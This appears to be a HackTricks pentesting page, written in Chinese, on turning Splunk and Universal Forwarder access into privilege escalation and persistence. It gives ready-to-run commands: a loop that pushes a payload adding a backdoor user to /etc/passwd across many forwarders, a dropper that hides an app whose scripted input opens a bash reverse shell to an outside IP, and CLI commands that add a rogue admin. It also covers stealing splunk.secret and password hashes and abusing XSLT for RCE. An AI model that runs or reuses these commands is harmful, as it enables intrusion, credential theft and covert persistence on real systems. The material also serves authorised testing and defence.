# Splunk LPE 与 Persistence

{{#include ../../banners/hacktricks-training.md}}

如果在对机器进行**内部**或**外部 enumerating**时发现正在运行 **Splunk**（Web UI 通常使用 **8000**，管理 API 通常使用 **8089**），有效凭据通常可以通过安装 app、scripted inputs 或管理操作转化为 **code execution**。<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> 如果 Splunk 以 **root** 身份运行，通常会立即导致 **privilege escalation**。<sup>[[1]](#references)</sup>

如果你只需要了解通用的远程攻击面、enumeration 或 app-upload RCE 路径，请查看：

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

如果你**已经是 root**，且 Splunk 服务并非仅监听 localhost，那么你还可以窃取 **Splunk password hashes**、恢复**加密 secrets**，或推送一个**恶意 app**，以便在本地或多个 forwarders 上保持 Persistence。<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## 有趣的本地文件

当你进入一台运行 Splunk 或 Splunk Universal Forwarder 的主机后，以下路径通常最值得关注：<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
重要工件：

- **`$SPLUNK_HOME/etc/passwd`**：本地 Splunk 用户及密码哈希。<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**：Splunk 用于加密存储在多个 `.conf` 文件中的 secrets 的密钥。<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**：初始 admin bootstrap 文件；在 gold images 和 provisioning 配置错误中很有用。如果 `etc/passwd` 已存在，则会忽略该文件。<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**：通常在此启用 scripted inputs。<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** 或 **`$SPLUNK_HOME/etc/apps/`**：适合隐藏 persistent app，或检查当前已分发的内容。<sup>[[11]](#references)</sup>

## Splunk Universal Forwarder Agent Exploit Summary

更多详情请查看 [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)。这里只是摘要。<sup>[[1]](#references)</sup>

**Exploit 概述：**
针对 Splunk Universal Forwarder（UF）的 exploit 允许拥有 **agent password** 的攻击者在运行该 agent 的系统上执行任意代码，从而可能 compromize 环境中的大部分系统。<sup>[[1]](#references)</sup>

**原理：**

- UF 管理服务通常暴露在 **TCP 8089** 上。<sup>[[6]](#references)</sup>
- 攻击者可以向 API 进行认证，并指示 forwarder 安装 **malicious app bundle**。<sup>[[1]](#references)[[5]](#references)</sup>
- 同一 primitive 可在本地用于 **LPE**，或远程用于 **RCE**。<sup>[[5]](#references)</sup>
- **SplunkWhisperer2** 等公开 tooling 会自动创建 app bundle，并能为 Linux targets 调整 payload。<sup>[[5]](#references)</sup>

**恢复 password 的常见方式：**

- documentation、scripts、shares 或 deployment automation 中的明文凭据。<sup>[[1]](#references)</sup>
- `$SPLUNK_HOME/etc/passwd` 中的 password hashes，然后进行 offline cracking。<sup>[[1]](#references)[[7]](#references)</sup>
- gold images 或 provisioning 遗留内容，例如 `user-seed.conf`。<sup>[[1]](#references)[[9]](#references)</sup>

**影响：**

- 在每个被 compromize 的 host 上以 SYSTEM/root 级别执行代码。<sup>[[1]](#references)</sup>
- 部署 persistent apps、backdoors 或 ransomware。<sup>[[1]](#references)</sup>
- 在数据被转发之前禁用或篡改 telemetry。<sup>[[1]](#references)</sup>

**用于 exploitation 的示例命令：**

原始报告展示了以下 loop，用于向多个 forwarders 发送 payload。<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**可用的公开 exploits：**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## 通过 Scripted Inputs 或 Malicious Apps 实现 Persistence

如果你以 `root`/`splunk` 身份拥有**文件系统写入权限**，或拥有用于安装 apps 的 authenticated access，那么部署带有 **scripted input** 的**自定义 app**是一种非常可靠的 persistence 机制。<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Splunk 的官方文档要求 scripted inputs 位于 app 目录下，并通过 `inputs.conf` 启用。<sup>[[10]](#references)</sup>

典型布局：
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
最简 `inputs.conf`:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Quick Linux dropper（使用该 documented app layout）：<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
注意：

- 同样的 trick 适用于 **Universal Forwarder**，使用 `/opt/splunkforwarder/etc/apps/`。<sup>[[2]](#references)[[10]](#references)</sup>
- Attackers 通常会通过修改合法 add-on 来隐藏自身，而不是创建一个明显恶意的 app。<sup>[[2]](#references)</sup>
- 在 **deployment server** 上，将恶意 app 植入 `deployment-apps/` 会变成**全局持久化**，因为 forwarders 会轮询、下载更新后的 apps，并且通常会重启以应用这些更新。<sup>[[11]](#references)[[12]](#references)</sup>

## 凭据窃取与管理员接管

如果你可以读取 Splunk 的本地文件，通常有两个主要目标：恢复 **Splunk 管理员访问权限**，以及恢复**加密的服务凭据**。<sup>[[8]](#references)</sup>

### 密码哈希与本地用户

Splunk 将本地认证数据存储在 `etc/passwd` 中。根据部署方式，对该文件进行破解可能会恢复可用于 Web UI 和管理 API 的有效凭据。<sup>[[1]](#references)[[7]](#references)</sup>

如果你已经拥有有效的 **admin** 凭据，并且 Splunk 使用其 **native** 认证后端，则 CLI 本身就可以用于持久化。<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` 和加密值

Splunk 使用 `etc/auth/splunk.secret` 来保护存储在多个配置文件中的敏感值。如果你能同时窃取 **secret** 和相关的 **`.conf` 文件**，通常就可以恢复或重放：<sup>[[8]](#references)</sup>

- forwarder/indexer 共享 secret，例如 `pass4SymmKey`
- TLS 私钥密码，例如 `sslPassword`
- LDAP bind 凭据，例如 `bindDNPassword`

即使 Splunk admin 密码无法 crack，这也可以支持 **lateral movement**。<sup>[[8]](#references)</sup>

### `user-seed.conf` abuse

`user-seed.conf` 只会在首次启动或 `etc/passwd` 不存在时被读取。这使得它在 live box 上不太有用，但在以下场景中非常值得关注：<sup>[[9]](#references)</sup>

- 被 compromise 的 installation templates
- container images
- unattended provisioning workflows
- Splunk 会被自动重新初始化的 appliances

在这些情况下，植入使用 `splunk hash-passwd` 生成的 `HASHED_PASSWORD`，可以让你在重新部署后悄无声息地重新获得 admin access。<sup>[[9]](#references)</sup>

## 滥用 Splunk Queries

更多详情请查看 [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)。<sup>[[3]](#references)[[4]](#references)</sup>

一种近期很有用的 technique 是在存在漏洞的 Splunk Enterprise 版本中滥用 **user-supplied XSLT**，将低权限的 authenticated account 转化为以 `splunk` 用户身份执行 **OS command**。<sup>[[3]](#references)[[4]](#references)</sup>

High-level flow：<sup>[[3]](#references)[[4]](#references)</sup>

1. Authenticate to Splunk。
2. 通过 preview/upload functionality 上传恶意的 **XSL** 文件。
3. 让 Splunk 使用从 **dispatch** directory 中上传的 stylesheet 来渲染 search results。
4. 使用 XSLT payload 写入文件，或通过 Splunk 的 search pipeline 触发 execution（例如访问 `runshellscript` 等 internal functionality）。

重要的 offensive takeaway 是，这条路径可以实现 **post-auth RCE，而不需要 app upload**。在 Linux 上，它通常会让你进入 **`splunk`** account；这仍然很有价值，因为该用户通常拥有 application tree，可读取 secrets，还能植入即使 shell 丢失后仍能存活的 persistent apps。<sup>[[3]](#references)[[4]](#references)</sup>

利用过程中使用的一个代表性路径是：<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
如果 Splunk 以过高权限运行，或者 `splunk` 用户可以访问危险脚本、可写的 service units 或不安全的 `sudo` 规则，那么这就会形成一条清晰的 **LPE** 链。

## References

- [1] [滥用 Splunk Forwarders 实现 RCE 和 Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [警惕 TraitorWare：使用 Splunk 实现 Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [CVE-2023-46214 分析：Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [更改默认值](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [在多台服务器上部署安全密码](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [设置 scripted input](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [创建 deployment apps](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [deployment 更新的执行方式](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [使用 CLI 配置用户](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
